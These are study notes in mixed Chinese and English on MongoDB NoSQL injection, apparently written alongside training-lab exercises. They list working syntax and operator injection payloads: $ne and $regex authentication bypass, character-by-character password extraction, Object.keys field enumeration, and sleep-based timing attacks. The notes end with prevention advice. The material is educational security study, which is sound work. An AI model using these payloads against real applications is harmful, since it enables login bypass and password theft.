## NoSQL injection
- MongoDB
-  JSON 查詢
  
- **Syntax injection**
    - 注入您自己的有效載荷
    - 提交模糊字串和特殊字符
 
- **Operator injection**
    - 使用 NoSQL 查詢運算子

**Example :**
- https://insecure-website.com/product/lookup?category=fizzy
- this.category == 'fizzy'
- this.category == '\"`{\r;$Foo}\n$Foo \\xYZ\u0000
- https://insecure-website.com/product/lookup?category='%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00

## Syntax injection
### 查詢哪些字元會被應用程式解釋為語法
- 注入單一字元 [`] : this.category == '''
  - 如果這導致原始回應發生變化，則可能表示該'字元破壞了查詢語法並導致了語法錯誤
  - Retest : this.category == '\''
 
### 確認條件行為
- 假 : ' && 0 && 'x (lookup?category=fizzy'+%26%26+0+%26%26+'x)
- 真 : ' && 1 && 'x (lookup?category=fizzy'+%26%26+1+%26%26+'x)
- 真 JavaScript 條件，例如 '||'1'=='1 (this.category == 'fizzy'||'1'=='1')

### Attack 
- 新增一個空字元 : %00
  - https://insecure-website.com/product/lookup?category=fizzy'%00
  - this.category == 'fizzy'\u0000' && this.released == 1

### Lab: Detecting NoSQL injection
- Ctrl U = url encode
- 有效負載: Gifts'+'
- 布林條件: Gifts' && 0 && 'x | Gifts' && 1 && 'x
- Gifts'||1||'

## Operator injection
### 運算符
- $where- 符合滿足 JavaScript 表達式的文件
- $ne- 符合所有不等於指定值的值
- $in- 符合數組中指定的所有值
- $regex- 選擇值與指定正規表示式相符的文件 <br>

**Method :**
- 巢狀物件插入 :{"username":{"$ne":"invalid"}}
-  URL 的輸入: username[$ne]=invalid
-  將請求方法從 轉換GET為POST。
-  將標題更改Content-Type為application/json。
-  將 JSON 新增到訊息正文。
-  在 JSON 中註入查詢運算 <br>

**Example :**
- {"username":"wiener","password":"peter"}
- {"username":{"$ne":"invalid"},"password":"peter"}
- {"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}
- {"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}

### Lab: Exploiting NoSQL operator injection to bypass authentication
- {"username":"wiener"}
- {"username":{"$ne":""}}
- {"username":{"$regex":"wien.*"}}
- {"username":{"$ne":""},"password":{"$ne":""}}
- {"username":{"$regex":"admin.*"},"password":{"$ne":""}}

## Exploiting syntax injection to extract data
-  MongoDB 的$where運算子和mapReduce()函數。
-  將 JavaScript 函數注入查詢
-  **$where**
    - {"$where":"this.username == 'admin'"}
    - "admin' && this.password[0] == 'a' || 'a'=='b"
    - match() : "admin' && this.password.match(/\d/) || 'a'=='b"

### 識別 MongoDB 資料庫有效字段
  - password字段:lookup?username=admin'+%26%26+this.password!%3d'
  - admin' && this.username!='
  - admin' && this.foo!='
  - 執行字典攻擊
### Lab: Exploiting NoSQL injection to extract data
(*URL 編碼Ctrl-U*)
- try get passwords 
- GET /user/lookup?user=wiener
- 有效的 JavaScript 負載 : wiener'+'
- wiener' && '1'=='2 : should return could not found 
- wiener' && '1'=='1
- administrator' && this.password.length < 30 || 'a'=='b
- administrator' && this.password.length < 8 || 'a'=='b
- Intruder : administrator' && this.password[§0§]=='§a§
  - Payloads : 0-9 / a-z
  - Length : 為密碼的每個字元添加 0 到 7 之間的數字

## Exploiting NoSQL operator injection to extract data
- POST | 將$where運算子新增為附加參數
- false : {"username":"wiener","password":"peter", "$where":"0"}
- true  : {"username":"wiener","password":"peter", "$where":"1"}
- keys()方法提取資料欄位的名稱
  - "$where":"Object.keys(this)[0].match('^.{0}a.*')"
  - 逐個字元地提取欄位名稱
- $regex運算符
  - {"username":"myuser","password":"mypass"}
  - {"username":"admin","password":{"$regex":"^.*"}}
  - {"username":"admin","password":{"$regex":"^a*"}}
### Lab: Exploiting NoSQL operator injection to extract unknown fields
- test is that have no sql 
  - "invalid" --> {"$ne":"invalid"}
- test $where
  - test T/F
    - 在 JSON 資料中新增"$where": "0"
    - {"username":"carlos","password":{"$ne":"invalid"}, "$where": "0"}
    - "$where": "0" -->  "$where": "1"
  - get key() 
    - "$where":"Object.keys(this)[1].match('^.{}.*')"
    - "$where":"Object.keys(this)[1].match('^.{§§}§§.*')"
  - Payload 0-20 : a-z、A-Z、0-9
    -   "$where":"Object.keys(this)[2].match('^.{}.*')"
-   GET /forgot-password?YOURTOKENNAME=TOKENVALUE

## Timing based injection
- 有時觸發資料庫錯誤不會導致應用程式回應發生變化
- 故意延遲 : {"$where": "sleep(5000)"}
- 如果密碼包含字母 a
  - admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'
  - admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'
 
## Preventing NoSQL injection
- 使用可接受字元的允許清單來清理和驗證使用者輸入。
- 使用參數化查詢插入使用者輸入，而不是將使用者輸入直接連接到查詢。
- 為了防止操作員注入，請套用可接受金鑰的允許清單。
